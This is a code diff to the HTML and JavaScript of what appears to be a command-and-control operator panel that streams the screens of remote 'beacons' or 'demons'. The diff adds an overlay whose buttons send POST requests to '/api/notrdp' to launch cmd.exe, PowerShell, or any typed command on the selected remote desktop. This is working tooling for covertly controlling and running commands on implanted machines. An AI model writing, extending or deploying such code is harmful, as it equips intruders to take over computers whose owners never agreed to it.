@@ -108,6 +108,55 @@ body{
   letter-spacing:.5px;
 }
 
+.launch-overlay{
+  position:absolute;
+  bottom:14px;
+  right:14px;
+  z-index:20;
+  display:none;
+  flex-direction:column;
+  gap:5px;
+  align-items:flex-end;
+}
+.launch-overlay.visible{display:flex}
+.launch-btn{
+  background:rgba(15,22,40,.85);
+  border:1px solid #1e3055;
+  color:#8fa4c0;
+  font:inherit;
+  font-size:11px;
+  padding:5px 12px;
+  border-radius:3px;
+  cursor:pointer;
+  white-space:nowrap;
+  backdrop-filter:blur(6px);
+  transition:all .15s;
+  line-height:1;
+}
+.launch-btn:hover{background:rgba(22,34,64,.95);color:#b0c4e0;border-color:#2a4070}
+.launch-btn:active{background:rgba(26,40,80,.95)}
+.launch-btn.cmd{color:#34d399;border-color:#134030}
+.launch-btn.cmd:hover{background:rgba(15,42,32,.95);color:#5eead4;border-color:#1a5040}
+
+.run-input-row{
+  display:none;
+  gap:4px;
+  align-items:center;
+}
+.run-input-row.open{display:flex}
+.run-input-row input{
+  background:rgba(15,22,40,.9);
+  border:1px solid #1e3055;
+  color:#b8c4d4;
+  font:inherit;
+  font-size:11px;
+  padding:5px 8px;
+  border-radius:3px;
+  width:180px;
+  outline:none;
+}
+.run-input-row input:focus{border-color:#3b8ef8}
+
 .click-ripple{
   position:absolute;
   width:20px;height:20px;
@@ -144,6 +193,15 @@ body{
 <div class="screen-area" id="screenArea" tabindex="0">
   <img id="screenImg" style="display:none" draggable="false">
   <div class="placeholder" id="placeholder">select a beacon and press start</div>
+  <div class="launch-overlay" id="launchOverlay">
+    <button class="launch-btn cmd" id="btnCmd" title="Launch cmd.exe">&#9654; cmd</button>
+    <button class="launch-btn" id="btnPwsh" title="Launch PowerShell">&#9654; pwsh</button>
+    <button class="launch-btn" id="btnRun" title="Run custom command">run...</button>
+    <div class="run-input-row" id="runRow">
+      <input type="text" id="runInput" placeholder="e.g. notepad.exe" spellcheck="false">
+      <button class="launch-btn cmd" id="btnRunGo">&#9654;</button>
+    </div>
+  </div>
 </div>
 
 <script>
@@ -158,7 +216,7 @@ body{
   var latencyMs = 0;
   var lastFrameBytes = 0;
 
-  var $sel, $img, $ph, $status, $area;
+  var $sel, $img, $ph, $status, $area, $overlay, $runRow, $runInput;
 
   function $(id){ return document.getElementById(id); }
 
@@ -168,10 +226,14 @@ body{
     $ph = $('placeholder');
     $status = $('status');
     $area = $('screenArea');
+    $overlay = $('launchOverlay');
+    $runRow = $('runRow');
+    $runInput = $('runInput');
 
     refreshDemons();
     setInterval(refreshDemons, 5000);
     setupInput();
+    setupLauncher();
     window.addEventListener('resize', resizeImage);
   }
 
@@ -228,6 +290,7 @@ body{
     $status.className = 'status-text live';
     frameTimes = [];
     longPollFrame();
+    $overlay.classList.add('visible');
     $area.focus();
   }
 
@@ -238,6 +301,8 @@ body{
     $status.textContent = 'idle';
     $status.className = 'status-text';
     frameTimes = [];
+    $overlay.classList.remove('visible');
+    $runRow.classList.remove('open');
   }
 
   function resizeImage(){
@@ -418,6 +483,41 @@ body{
           x:_lastMouseX, y:_lastMouseY});
       }
     });
+  }
+
+  function launchOnDesktop(cmd){
+    if(!activeDemon) return;
+    fetch(API + '/api/notrdp', {
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({demon_id:activeDemon, action:'run', cmd:cmd})
+    }).catch(function(){});
+  }
+
+  function setupLauncher(){
+    $overlay.addEventListener('mousedown', function(e){ e.stopPropagation(); });
+    $overlay.addEventListener('click', function(e){ e.stopPropagation(); });
+    $overlay.addEventListener('dblclick', function(e){ e.stopPropagation(); });
+    $overlay.addEventListener('contextmenu', function(e){ e.stopPropagation(); e.preventDefault(); });
+
+    $('btnCmd').addEventListener('click', function(){ launchOnDesktop('cmd.exe'); });
+    $('btnPwsh').addEventListener('click', function(){ launchOnDesktop('powershell.exe'); });
+    $('btnRun').addEventListener('click', function(){
+      $runRow.classList.toggle('open');
+      if($runRow.classList.contains('open')) $runInput.focus();
+    });
+    $('btnRunGo').addEventListener('click', function(){
+      var cmd = $runInput.value.trim();
+      if(cmd){ launchOnDesktop(cmd); $runInput.value = ''; }
+    });
+    $runInput.addEventListener('keydown', function(e){
+      e.stopPropagation();
+      if(e.key === 'Enter'){
+        var cmd = $runInput.value.trim();
+        if(cmd){ launchOnDesktop(cmd); $runInput.value = ''; }
+      }
+    });
+    $runInput.addEventListener('keyup', function(e){ e.stopPropagation(); });
   }
 
   function onImgLoad(){
